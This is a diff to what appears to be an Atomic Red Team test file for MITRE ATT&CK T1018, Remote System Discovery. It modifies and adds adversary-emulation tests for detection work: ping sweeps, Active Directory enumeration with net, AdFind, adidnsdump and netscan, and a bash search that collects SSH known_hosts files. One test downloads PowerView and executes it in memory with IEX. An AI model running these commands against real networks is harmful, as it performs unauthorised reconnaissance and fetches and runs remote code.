@@ -1,5 +1,5 @@
 attack_technique: T1018
-display_name: Remote System Discovery
+display_name: "Remote System Discovery"
 atomic_tests:
 - name: Remote System Discovery - net
   auto_generated_guid: 85321a9c-897f-4a60-9f20-29788e50bccd
@@ -37,7 +37,7 @@ atomic_tests:
   input_arguments:
     target_domain:
       description: Domain to query for domain controllers
-      type: String
+      type: string
       default: '%userdnsdomain%'
   executor:
     command: |
@@ -51,9 +51,22 @@ atomic_tests:
     Upon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.
   supported_platforms:
   - windows
+  input_arguments:
+    start_host:
+      description: Last octet starting value for ping sweep.
+      type: string
+      default: "1"
+    stop_host:
+      description: Last octet ending value for ping sweep.
+      type: string
+      default: "254"
+    subnet:
+      description: Subnet used for ping sweep.
+      type: string
+      default: 192.168.1
   executor:
     command: |
-      for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
+      for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  
     name: command_prompt
 - name: Remote System Discovery - arp
   auto_generated_guid: 2d5a61f5-0447-4be4-944a-1f8530ed6574
@@ -100,15 +113,15 @@ atomic_tests:
   input_arguments:
     start_host:
       description: Subnet used for ping sweep.
-      type: String
+      type: string
       default: "1"
     stop_host:
       description: Subnet used for ping sweep.
-      type: String
+      type: string
       default: "254"
     subnet:
       description: Subnet used for ping sweep.
-      type: String
+      type: string
       default: 192.168.1
   executor:
     command: |
@@ -143,88 +156,96 @@ atomic_tests:
   input_arguments:
     user_name:
       description: username including domain.
-      type: String
+      type: string
       default: 'domain\user'
     acct_pass:
       description: Account password.
-      type: String
+      type: string
       default: "password"
     host_name:
       description: hostname or ip address to connect to.
-      type: String
+      type: string
       default: "192.168.1.1"
+    venv_path:
+      description: Path to the folder for the tactics venv
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1018
   dependency_executor_name: powershell
   dependencies:
   - description: |
       Computer must have python 3 installed
     prereq_command: |
-      if (python --version) {exit 0} else {exit 1}
+      if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      echo "Python 3 must be installed manually"
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+      invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -UseBasicParsing
+      Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
   - description: |
-      Computer must have pip installed
+      Computer must have venv configured at #{venv_path}
     prereq_command: |
-      if (pip3 -V) {exit 0} else {exit 1}
+      if (Test-Path -Path "#{venv_path}" ) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      echo "PIP must be installed manually"
+      py -m venv "#{venv_path}"
   - description: |
-      adidnsdump must be installed and part of PATH
+      adidnsdump must be installed
     prereq_command: |
-      if (cmd /c adidnsdump -h) {exit 0} else {exit 1}
+      if (Get-Command "#{venv_path}\Scripts\adidnsdump" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      pip3 install adidnsdump
+      & "#{venv_path}\Scripts\pip.exe" install --no-cache-dir adidnsdump 2>&1 | Out-Null
   executor:
     command: |
-      adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
+      "#{venv_path}\Scripts\adidnsdump" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
     name: command_prompt
     elevation_required: true
 - name: Adfind - Enumerate Active Directory Computer Objects
   auto_generated_guid: a889f5be-2d54-4050-bd05-884578748bb4
-  description: | 
+  description: |
     Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects
     reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
   supported_platforms:
   - windows
   input_arguments:
-    adfind_path:
-      description: Path to the AdFind executable
-      type: Path
-      default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+    optional_args:
+      description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces.
+      type: string
+      default:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      AdFind.exe must exist on disk at specified location (#{adfind_path})
+      AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
     prereq_command: |
-      if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
+      New-Item -Type Directory (split-path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -UseBasicParsing
   executor:
     command: |
-      #{adfind_path} -f (objectcategory=computer)
+      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=computer) #{optional_args}
     name: command_prompt
 - name: Adfind - Enumerate Active Directory Domain Controller Objects
   auto_generated_guid: 5838c31e-a0e2-4b9f-b60a-d79d2cb7995e
-  description: | 
+  description: |
     Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects
     reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
   supported_platforms:
   - windows
   input_arguments:
-    adfind_path:
-      description: Path to the AdFind executable
-      type: Path
-      default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+    optional_args:
+      description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces.
+      type: string
+      default:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      AdFind.exe must exist on disk at specified location (#{adfind_path})
+      AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
     prereq_command: |
-      if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
+      New-Item -Type Directory (split-path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -UseBasicParsing
   executor:
     command: |
-      #{adfind_path} -sc dclist
+      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -sc dclist
     name: command_prompt
 
 - name: Remote System Discovery - ip neighbour
@@ -265,6 +286,17 @@ atomic_tests:
       ip route show
     name: sh
 
+- name: Remote System Discovery - netstat
+  auto_generated_guid: d2791d72-b67f-4615-814f-ec824a91f514
+  description: |
+    Use the netstat command to display the kernels routing tables.
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      netstat -r | grep default
+    name: sh
+
 - name: Remote System Discovery - ip tcp_metrics
   auto_generated_guid: 6c2da894-0b57-43cb-87af-46ea3b501388
   description: |
@@ -294,9 +326,9 @@ atomic_tests:
   - windows
   dependency_executor_name: powershell
   dependencies:
-  - description: This PC must be joined to a domain. 
+  - description: This PC must be joined to a domain.
     prereq_command: |-
-     if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}		
+      if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}
     get_prereq_command: |-
       write-host "This PC must be manually added to a domain." 
   executor:
@@ -347,7 +379,7 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
     name: powershell
-- name: Get-wmiobject to Enumerate Domain Controllers
+- name: Get-WmiObject to Enumerate Domain Controllers
   auto_generated_guid: e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad
   description: |
     The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.
@@ -359,4 +391,76 @@ atomic_tests:
     name: powershell
     elevation_required: false
     command: |
-      get-wmiobject -class ds_computer -namespace root\directory\ldap
+      try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
+      catch { $_; exit $_.Exception.HResult }
+- name: Remote System Discovery - net group Domain Controller
+  auto_generated_guid: 5843529a-5056-4bc1-9c13-a311e2af4ca0
+  description: |
+    Identify remote systems with net.exe querying the Active Directory Domain Controller.
+    Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the "Domain Controller" in the domain. Output will be via stdout.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      net group /domain "Domain controllers"
+    name: command_prompt
+- name: Enumerate Remote Hosts with Netscan
+  auto_generated_guid: b8147c9a-84db-4ec1-8eee-4e0da75f0de5
+  description: This test uses Netscan to identify remote hosts in a specified network range. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    netscan_path:
+      description: NetScan exe location
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\netscan\64-bit\netscan.exe'
+    range_to_scan:
+      description: The IP range to scan with Netscan
+      type: string
+      default: '127.0.0.1-127.0.0.1'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Netscan must be installed
+    prereq_command: 'if (Test-Path "#{netscan_path}") {exit 0} else {exit 1}'
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\netscan.zip" "https://www.softperfect.com/download/files/netscan_portable.zip" -UseBasicParsing
+      Expand-Archive -LiteralPath "PathToAtomicsFolder\..\ExternalPayloads\netscan.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\netscan"
+  executor:
+    command: |-
+      cmd /c '#{netscan_path}' /hide /auto:"$env:temp\T1018NetscanOutput.txt" /range:'#{range_to_scan}'
+    cleanup_command: |
+      remove-item "$env:temp\T1018NetscanOutput.txt" -force -erroraction silentlycontinue
+    name: powershell
+    elevation_required: false
+- name: Enumerate SSH Configuration
+  auto_generated_guid: 6fc814cb-16d1-43e6-80b3-2ff2a45250d1
+  description: |
+    SSH metadata files (authorized_keys, known_hosts, config) can be used to
+    discover remote systems and trust relationships. known_hosts
+    reveals previously connected servers, config exposes host aliases and jump
+    proxies, and authorized_keys shows which public keys are trusted for login.
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    search_path:
+      description: Directory to search under
+      type: string
+      default: /
+    filename:
+      description: SSH metadata file to search for
+      type: string
+      default: known_hosts
+    output_file:
+      description: File to write results to
+      type: path
+      default: /tmp/ssh_enum.txt
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      find #{search_path} -name "#{filename}" -type f 2>/dev/null | while read -r file; do echo "=== $file ===" >> #{output_file}; cat "$file" >> #{output_file}; done
+    cleanup_command: |
+      rm -f #{output_file}
